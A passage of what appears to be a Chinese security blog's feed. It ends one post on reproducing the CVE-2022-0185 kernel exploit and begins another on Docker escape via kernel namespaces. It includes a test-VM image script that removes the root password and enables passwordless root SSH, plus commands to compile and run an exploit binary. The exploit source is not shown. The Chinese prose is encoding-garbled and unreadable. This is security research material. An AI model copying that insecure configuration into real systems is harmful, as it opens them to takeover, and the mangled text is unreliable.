DEBARCH=ppc64el</span><br><span class="line">    ;;</span><br><span class="line">    aarch64)</span><br><span class="line">        DEBARCH=arm64</span><br><span class="line">    ;;</span><br><span class="line">    arm)</span><br><span class="line">        DEBARCH=armel</span><br><span class="line">    ;;</span><br><span class="line">    x86_64)</span><br><span class="line">        DEBARCH=amd64</span><br><span class="line">    ;;</span><br><span class="line">    *)</span><br><span class="line">        DEBARCH=<span class="variable">$ARCH</span></span><br><span class="line">    ;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Foreign architecture</span></span><br><span class="line"></span><br><span class="line">FOREIGN=<span class="literal">false</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$ARCH</span> != $(uname -m) ]; <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># i386 on an x86_64 host is exempted, as we can run i386 binaries natively</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$ARCH</span> != <span class="string">&quot;i386&quot;</span> -o $(uname -m) != <span class="string">&quot;x86_64&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        FOREIGN=<span class="literal">true</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$FOREIGN</span> = <span class="string">&quot;true&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># Check for according qemu static binary</span></span><br><span class="line">    <span class="keyword">if</span> ! <span class="built_in">which</span> qemu-<span class="variable">$ARCH</span>-static; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Please install qemu static binary for architecture <span class="variable">$ARCH</span> (package &#x27;qemu-user-static&#x27; on Debian/Ubuntu/Fedora)&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="comment"># Check for according binfmt entry</span></span><br><span class="line">    <span class="keyword">if</span> [ ! -r /proc/sys/fs/binfmt_misc/qemu-<span class="variable">$ARCH</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;binfmt entry /proc/sys/fs/binfmt_misc/qemu-<span class="variable">$ARCH</span> does not exist&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Double check KERNEL when PERF is enabled</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$PERF</span> = <span class="string">&quot;true&quot;</span> ] &amp;&amp; [ -z <span class="variable">$&#123;KERNEL+x&#125;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Please set KERNEL environment variable when PERF is enabled&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If full feature is chosen, install more packages</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$FEATURE</span> = <span class="string">&quot;full&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    PREINSTALL_PKGS=<span class="variable">$PREINSTALL_PKGS</span><span class="string">&quot;,&quot;</span><span class="variable">$ADD_PACKAGE</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">sudo rm -rf <span class="variable">$DIR</span></span><br><span class="line">sudo mkdir -p <span class="variable">$DIR</span></span><br><span class="line">sudo chmod 0755 <span class="variable">$DIR</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. debootstrap stage</span></span><br><span class="line"></span><br><span class="line">DEBOOTSTRAP_PARAMS=<span class="string">&quot;--arch=<span class="variable">$DEBARCH</span> --no-check-gpg --include=<span class="variable">$PREINSTALL_PKGS</span> --components=main,contrib,non-free,non-free-firmware <span class="variable">$RELEASE</span> <span class="variable">$DIR</span>&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$FOREIGN</span> = <span class="string">&quot;true&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    DEBOOTSTRAP_PARAMS=<span class="string">&quot;--foreign <span class="variable">$DEBOOTSTRAP_PARAMS</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># riscv64 is hosted in the debian-ports repository</span></span><br><span class="line"><span class="comment"># debian-ports doesn&#x27;t include non-free, so we exclude firmware-atheros</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$DEBARCH</span> == <span class="string">&quot;riscv64&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    DEBOOTSTRAP_PARAMS=<span class="string">&quot;--keyring /usr/share/keyrings/debian-ports-archive-keyring.gpg --exclude firmware-atheros <span class="variable">$DEBOOTSTRAP_PARAMS</span> http://deb.debian.org/debian-ports&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">sudo --preserve-env=http_proxy,https_proxy,ftp_proxy,no_proxy debootstrap <span class="variable">$DEBOOTSTRAP_PARAMS</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. debootstrap stage: only necessary if target != host architecture</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$FOREIGN</span> = <span class="string">&quot;true&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    sudo cp $(<span class="built_in">which</span> qemu-<span class="variable">$ARCH</span>-static) <span class="variable">$DIR</span>/$(<span class="built_in">which</span> qemu-<span class="variable">$ARCH</span>-static)</span><br><span class="line">    sudo chroot <span class="variable">$DIR</span> /bin/bash -c <span class="string">&quot;/debootstrap/debootstrap --second-stage&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set some defaults and enable promtless ssh to the machine for root.</span></span><br><span class="line">sudo sed -i <span class="string">&#x27;/^root/ &#123; s/:x:/::/ &#125;&#x27;</span> <span class="variable">$DIR</span>/etc/passwd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;T0:23:respawn:/sbin/getty -L ttyS0 115200 vt100&#x27;</span> | sudo tee -a <span class="variable">$DIR</span>/etc/inittab</span><br><span class="line"><span class="built_in">printf</span> <span class="string">&#x27;\nauto eth0\niface eth0 inet dhcp\n&#x27;</span> | sudo tee -a <span class="variable">$DIR</span>/etc/network/interfaces</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/dev/root / ext4 defaults 0 0&#x27;</span> | sudo tee -a <span class="variable">$DIR</span>/etc/fstab</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;debugfs /sys/kernel/debug debugfs defaults 0 0&#x27;</span> | sudo tee -a <span class="variable">$DIR</span>/etc/fstab</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;securityfs /sys/kernel/security securityfs defaults 0 0&#x27;</span> | sudo tee -a <span class="variable">$DIR</span>/etc/fstab</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;configfs /sys/kernel/config/ configfs defaults 0 0&#x27;</span> | sudo tee -a <span class="variable">$DIR</span>/etc/fstab</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;binfmt_misc /proc/sys/fs/binfmt_misc binfmt_misc defaults 0 0&#x27;</span> | sudo tee -a <span class="variable">$DIR</span>/etc/fstab</span><br><span class="line"><span class="built_in">echo</span> -en <span class="string">&quot;127.0.0.1\tlocalhost\n&quot;</span> | sudo tee <span class="variable">$DIR</span>/etc/hosts</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nameserver 8.8.8.8&quot;</span> | sudo tee -a <span class="variable">$DIR</span>/etc/resolve.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;syzkaller&quot;</span> | sudo tee <span class="variable">$DIR</span>/etc/hostname</span><br><span class="line">ssh-keygen -f <span class="variable">$RELEASE</span>.id_rsa -t rsa -N <span class="string">&#x27;&#x27;</span></span><br><span class="line">sudo mkdir -p <span class="variable">$DIR</span>/root/.ssh/</span><br><span class="line">cat <span class="variable">$RELEASE</span>.id_rsa.pub | sudo tee <span class="variable">$DIR</span>/root/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Add perf support</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$PERF</span> = <span class="string">&quot;true&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    cp -r <span class="variable">$KERNEL</span> <span class="variable">$DIR</span>/tmp/</span><br><span class="line">    BASENAME=$(basename <span class="variable">$KERNEL</span>)</span><br><span class="line">    sudo chroot <span class="variable">$DIR</span> /bin/bash -c <span class="string">&quot;apt-get update; apt-get install -y flex bison python-dev libelf-dev libunwind8-dev libaudit-dev libslang2-dev libperl-dev binutils-dev liblzma-dev libnuma-dev&quot;</span></span><br><span class="line">    sudo chroot <span class="variable">$DIR</span> /bin/bash -c <span class="string">&quot;cd /tmp/<span class="variable">$BASENAME</span>/tools/perf/; make&quot;</span></span><br><span class="line">    sudo chroot <span class="variable">$DIR</span> /bin/bash -c <span class="string">&quot;cp /tmp/<span class="variable">$BASENAME</span>/tools/perf/perf /usr/bin/&quot;</span></span><br><span class="line">    rm -r <span class="variable">$DIR</span>/tmp/<span class="variable">$BASENAME</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Add udev rules for custom drivers.</span></span><br><span class="line"><span class="comment"># Create a /dev/vim2m symlink for the device managed by the vim2m driver</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;ATTR&#123;name&#125;==&quot;vim2m&quot;, SYMLINK+=&quot;vim2m&quot;&#x27;</span> | sudo tee -a <span class="variable">$DIR</span>/etc/udev/rules.d/50-udev-default.rules</span><br><span class="line"></span><br><span class="line"><span class="comment"># Build a disk image</span></span><br><span class="line">dd <span class="keyword">if</span>=/dev/zero of=<span class="variable">$RELEASE</span>.img bs=1M seek=<span class="variable">$SEEK</span> count=1</span><br><span class="line">sudo mkfs.ext4 -F <span class="variable">$RELEASE</span>.img</span><br><span class="line">sudo mkdir -p /mnt/<span class="variable">$DIR</span></span><br><span class="line">sudo mount -o loop <span class="variable">$RELEASE</span>.img /mnt/<span class="variable">$DIR</span></span><br><span class="line">sudo cp -a <span class="variable">$DIR</span>/. /mnt/<span class="variable">$DIR</span>/.</span><br><span class="line">sudo umount /mnt/<span class="variable">$DIR</span></span><br></pre></td></tr></table></figure><p>å› ä¸ºæˆ‘ä¹Ÿç¨åšäº†ç‚¹ä¿®æ”¹ï¼Œæ€•ä»¥åå¿˜è®°äº†è¿™é‡Œè´´å‡ºæ¥è®°å½•ä¸€ä¸‹ã€‚</p><p>ç¬¬äºŒä¸ªå‘å°±æ˜¯å…³äºä¸Šé¢æåˆ°çš„å†…éƒ¨éš”ç¦»é—®é¢˜ï¼ŒåŒæ ·ä¹Ÿæ˜¯åœ¨æŸä½å¸ˆå‚…çš„åšå®¢æ–‡ç« ä¸­æåˆ°äº†åœ¨<code>linux kernel 5.14</code>ä»¥å‰ä¸å­˜åœ¨å†…éƒ¨éš”ç¦»é—®é¢˜ï¼Œéšå³å±…ç„¶ä»¥ä¸‹çŠ¯ä¸Šå»è¯´a3å¸ˆå‚…å†™çš„ctfwikié”™äº†ï¼Œåœ¨ç»è¿‡å‡ å¤©æŒ£æ‰ä¹‹åç»ˆäºæ³¨æ„åˆ°äº†åœ¨<code>linux kernel 5.9</code>ä»¥å‰çš„å†…éƒ¨éš”ç¦»å®ç°ã€‚</p><p>å†è®°å½•ä¸€ä¸‹ç¼–è¯‘é€‰é¡¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">gcc exp.c -masm=intel -static -no-pie -Wall -D_FILE_OFFSET_BITS=64 -I./libfuse libfuse3.a -g -lpthread -o exp -w</span><br><span class="line"><span class="comment"># make fuse</span></span><br><span class="line">sudo mount bullseye.img rootfs</span><br><span class="line">sudo cp exp rootfs/home/<span class="built_in">test</span></span><br><span class="line">objdump -d ./exp &gt; exp.txt</span><br><span class="line">sudo mkdir rootfs/home/<span class="built_in">test</span>/temp</span><br><span class="line">sudo umount rootfs</span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -cpu kvm64,+smep,+smap \</span><br><span class="line">  -kernel ./vmlinux \</span><br><span class="line">  -append <span class="string">&quot;console=ttyS0 root=/dev/sda rw&quot;</span> \</span><br><span class="line">  -hda ./bullseye.img \</span><br><span class="line">  -enable-kvm -m 3G -nographic \</span><br><span class="line">  -netdev user,id=t0, -device rtl8139,netdev=t0,id=nic0 \</span><br><span class="line">  -netdev user,id=t1, -device pcnet,netdev=t1,id=nic1 \</span><br><span class="line">  -s</span><br></pre></td></tr></table></figure><hr><p>å‚è€ƒé“¾æ¥ï¼š</p><p>â€‹    <a class="link"   href="https://arttnba3.cn/2023/01/11/CVE-0X09-CVE-2022-0185/" >https://arttnba3.cn/2023/01/11/CVE-0X09-CVE-2022-0185/<i class="fas fa-external-link-alt"></i></a></p><p>â€‹    <a class="link"   href="https://zhuanlan.zhihu.com/p/93592262" >https://zhuanlan.zhihu.com/p/93592262<i class="fas fa-external-link-alt"></i></a></p><p>â€‹    <a class="link"   href="https://www.willsroot.io/2022/01/cve-2022-0185.html" >https://www.willsroot.io/2022/01/cve-2022-0185.html<i class="fas fa-external-link-alt"></i></a></p><p>â€‹    <a class="link"   href="https://elixir.bootlin.com/linux/v5.4/source" >https://elixir.bootlin.com/linux/v5.4/source<i class="fas fa-external-link-alt"></i></a></p><p>â€‹    <a class="link"   href="https://github.com/Crusaders-of-Rust/CVE-2022-0185" >https://github.com/Crusaders-of-Rust/CVE-2022-0185<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;å…¶å®å¹¶ä¸æ˜¯å¾ˆæƒ³å¤ç°è¿™ä¸ªæ´ï¼Œä½†æ˜¯åœ¨å‰äº›å¤©fmyyå‘Šè¯‰äº†æˆ‘ä¸€ä¸ªåˆ©ç”¨æ–¹å¼&lt;code&gt;fuse&lt;/code&gt;ï¼Œè™½ç„¶ä»–ä¹Ÿç»™æˆ‘æ¨èäº†å¯¹åº”çš„CVEï¼Œä¸è¿‡æˆ‘</summary>
      
    
    
    
    <category term="Linux Kernel" scheme="https://196082.github.io/categories/Linux-Kernel/"/>
    
    <category term="CVEå¤ç°" scheme="https://196082.github.io/categories/Linux-Kernel/CVE%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="msg_msg" scheme="https://196082.github.io/tags/msg-msg/"/>
    
    <category term="pipe_buffer" scheme="https://196082.github.io/tags/pipe-buffer/"/>
    
    <category term="Filesystem" scheme="https://196082.github.io/tags/Filesystem/"/>
    
    <category term="fuse" scheme="https://196082.github.io/tags/fuse/"/>
    
    <category term="seq_operations" scheme="https://196082.github.io/tags/seq-operations/"/>
    
  </entry>
  
  <entry>
    <title>æµ…å°docker escape</title>
    <link href="https://196082.github.io/2023/09/30/%E6%B5%85%E5%B0%9Ddocker-escape/"/>
    <id>https://196082.github.io/2023/09/30/%E6%B5%85%E5%B0%9Ddocker-escape/</id>
    <published>2023-09-30T03:17:07.000Z</published>
    <updated>2023-11-29T10:10:55.600Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿‘æœŸå› ä¸ºå·¥ä½œä¸Šçš„å†…å®¹æ¯”è¾ƒå¤šå‹å¾—æ¯”è¾ƒç´§æ‰€ä»¥ä¸€ç›´æ²¡æœ‰å»å­¦ä¹ æ–°çš„ä¸œè¥¿ï¼Œä¹Ÿæ²¡æœ‰æ›´æ–°åšå®¢ã€‚æ‰€ä»¥æœ€è¿‘å‘¢ä¹Ÿå°±æŒ‘ä¸€ä¸ªæ¯”è¾ƒç®€å•ä¸€ç‚¹çš„ä¸œè¥¿å­¦äº†ä¸€ä¸‹ã€‚åœ¨ç´§è·Ÿç€çš„ä¸‹ä¸€ç¯‡æ–‡ç« å¯èƒ½æ˜¯å…³äº<code>syzkaller</code>çš„ï¼Œæˆ–è€…å°±æ˜¯æˆ‘å‰é˜µå­åˆ†æçš„<code>Stack Rot</code>ï¼Œæ—¶é—´å¤šçš„è¯å¯èƒ½è¿˜ä¼šå»æ›´æ–°ä¸€ä¸‹<code>Rootkit</code>ã€‚</p><p>è¿™é‡Œä¼šä»‹ç»å› ä¸ºé…ç½®é—®é¢˜å¼•èµ·çš„é€ƒé€¸ï¼Œä½†æ˜¯æ›´å¤šçš„ä¼šè®²è§£å¦‚ä½•åˆ©ç”¨å†…æ ¸æ¼æ´å®ç°é€ƒé€¸ï¼Œä»¥åŠé€šè¿‡å†…æ ¸æ¼æ´å®ç°é€ƒé€¸çš„åŸç†ã€‚</p><h2 id="Linux-kernel-namespaceæœºåˆ¶"><a href="#Linux-kernel-namespaceæœºåˆ¶" class="headerlink" title="Linux  kernel namespaceæœºåˆ¶"></a>Linux  kernel namespaceæœºåˆ¶</h2><p><code>Linux Namespaces</code>æœºåˆ¶æä¾›ä¸€ç§èµ„æºéš”ç¦»æ–¹æ¡ˆã€‚PID,IPC,Networkç­‰ç³»ç»Ÿèµ„æºä¸å†æ˜¯å…¨å±€æ€§çš„ï¼Œè€Œæ˜¯å±äºæŸä¸ªç‰¹å®šçš„<code>Namespace</code>ã€‚æ¯ä¸ª<code>namespace</code>ä¸‹çš„èµ„æºå¯¹äºå…¶ä»–<code>namespace</code>ä¸‹çš„èµ„æºéƒ½æ˜¯é€æ˜ï¼Œä¸å¯è§çš„ã€‚å› æ­¤åœ¨æ“ä½œç³»ç»Ÿå±‚é¢ä¸Šçœ‹ï¼Œå°±ä¼šå‡ºç°å¤šä¸ªç›¸åŒpidçš„è¿›ç¨‹ã€‚ç³»ç»Ÿä¸­å¯ä»¥åŒæ—¶å­˜åœ¨ä¸¤ä¸ªè¿›ç¨‹å·ä¸º0,1,2çš„è¿›ç¨‹ï¼Œç”±äºå±äºä¸åŒçš„<code>namespace</code>ï¼Œæ‰€ä»¥å®ƒä»¬ä¹‹é—´å¹¶ä¸å†²çªã€‚è€Œåœ¨ç”¨æˆ·å±‚é¢ä¸Šåªèƒ½çœ‹åˆ°å±äºç”¨æˆ·è‡ªå·±<code>namespace</code>ä¸‹çš„èµ„æºï¼Œä¾‹å¦‚ä½¿ç”¨pså‘½ä»¤åªèƒ½åˆ—å‡ºè‡ªå·±<code>namespace</code>ä¸‹çš„è¿›ç¨‹ã€‚è¿™æ ·æ¯ä¸ª<code>namespace</code>çœ‹ä¸Šå»å°±åƒä¸€ä¸ªå•ç‹¬çš„<code>Linux</code>ç³»ç»Ÿã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/2015-08-06-1.jpg"                                     ></p><h3 id="Linux-kernelä¸­namespaceç»“æ„ä½“"><a href="#Linux-kernelä¸­namespaceç»“æ„ä½“" class="headerlink" title="Linux kernelä¸­namespaceç»“æ„ä½“"></a>Linux kernelä¸­namespaceç»“æ„ä½“</h3><p>å½“å‰Linuxæ”¯æŒä»¥ä¸‹å…«ç§<code>namespace</code>ï¼Œå…·ä½“çš„å«ä¹‰è¿™é‡Œå°±ä¸è¿‡å¤šèµ˜è¿°äº†ï¼Œç½‘ä¸Šå­˜åœ¨å¾ˆå¤šç›¸å…³èµ„æ–™ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nsproxy</span> &#123;</span></span><br><span class="line"><span class="keyword">atomic_t</span> count;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uts_namespace</span> *<span class="title">uts_ns</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ipc_ns</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mnt_namespace</span> *<span class="title">mnt_ns</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid_namespace</span> *<span class="title">pid_ns_for_children</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net</span>      *<span class="title">net_ns</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">time_namespace</span> *<span class="title">time_ns</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">time_namespace</span> *<span class="title">time_ns_for_children</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cgroup_namespace</span> *<span class="title">cgroup_ns</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ›´å¤šå…³æ³¨çš„æ˜¯<code>namespace</code>ä¸è¿›ç¨‹ä¹‹é—´çš„å…³ç³»ï¼Œæ—¢ç„¶è¿™ä¹ˆè¯´é‚£ä¹ˆè‚¯å®šæ˜¯å­˜åœ¨å…³ç³»çš„ï¼Œæˆ‘ä»¬åˆçŸ¥é“çš„æ˜¯å†…æ ¸ä¸­ä½¿ç”¨çš„æ˜¯<code>task_struct</code>ç»“æ„ä½“æè¿°å½“å‰è¿›ç¨‹çš„çŠ¶æ€ï¼Œé‚£ä¹ˆåŠ¿å¿…åœ¨å…¶ç»“æ„ä½“æ±‡æ€»å­˜åœ¨ä¸€ä¸ªæˆå‘˜æ˜¯ä¸<code>namespace</code>ç›¸å…³çš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"><span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>*<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>*<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>*<span class="title">cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"><span class="comment">/* Cached requested key. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">cached_requested_key</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * executable name, excluding path.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * - normally initialized setup_new_exec()</span></span><br><span class="line"><span class="comment"> * - access it with [gs]et_task_comm()</span></span><br><span class="line"><span class="comment"> * - lock it with task_lock()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">char</span>comm[TASK_COMM_LEN];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nameidata</span>*<span class="title">nameidata</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSVIPC</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sysv_sem</span><span class="title">sysvsem</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sysv_shm</span><span class="title">sysvshm</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DETECT_HUNG_TASK</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>last_switch_count;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>last_switch_time;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/* Filesystem information: */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fs_struct</span>*<span class="title">fs</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Open file information: */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span>*<span class="title">files</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_IO_URING</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_task</span>*<span class="title">io_uring</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Namespaces: */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nsproxy</span>*<span class="title">nsproxy</span>;</span></span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å­˜åœ¨ä¸€ä¸ªæˆå‘˜ä¸º<code>nsproxy</code>çš„æŒ‡é’ˆï¼Œå…¶æŒ‡å‘çš„å°±æ˜¯<code>nsproxy</code>ç»“æ„ä½“ã€‚å¹¶ä¸”ç›¸æ¯”å„ä½åº”è¯¥èƒ½å¤Ÿæ³¨æ„åˆ°åœ¨<code>nsproxy</code>ç»“æ„ä½“ä¸­çš„<code>count</code>æˆå‘˜ï¼Œè¿™ä¸ªæˆå‘˜åœ¨å†…æ ¸çš„å¾ˆå¤šç»“æ„ä½“ä¸­éƒ½å­˜åœ¨ï¼Œä¸€èˆ¬è¢«å½“ä½œè¢«å¼•ç”¨çš„æ¬¡æ•°ï¼Œé‚£ä¹ˆè¿™é‡Œçš„è¿™ä¸ªæˆå‘˜ä¹Ÿæ˜¯åŒæ ·çš„å«ä¹‰ã€‚ä¸€èˆ¬å‡ºç°è¿™æ ·ä¸€ä¸ªæˆå‘˜å°±ä»£è¡¨è¯¥ç»“æ„å¯ä»¥è¢«å¤šä¸ªåœ°æ–¹ä½¿ç”¨ï¼Œé‚£ä¹ˆå¯¹äºè¿™é‡Œæ¥è¯´å°±æ˜¯å¤šä¸ªè¿›ç¨‹å¯ä»¥ä½¿ç”¨åŒä¸€ä¸ª<code>nsproxy</code>ç»“æ„ä½“ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nsproxy</span> <span class="title">init_nsproxy</span> =</span> &#123;</span><br><span class="line">.count= ATOMIC_INIT(<span class="number">1</span>),</span><br><span class="line">.uts_ns= &amp;init_uts_ns,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(CONFIG_POSIX_MQUEUE) || defined(CONFIG_SYSVIPC)</span></span><br><span class="line">.ipc_ns= &amp;init_ipc_ns,</span><br><span class="line"><span class="meta">#<span 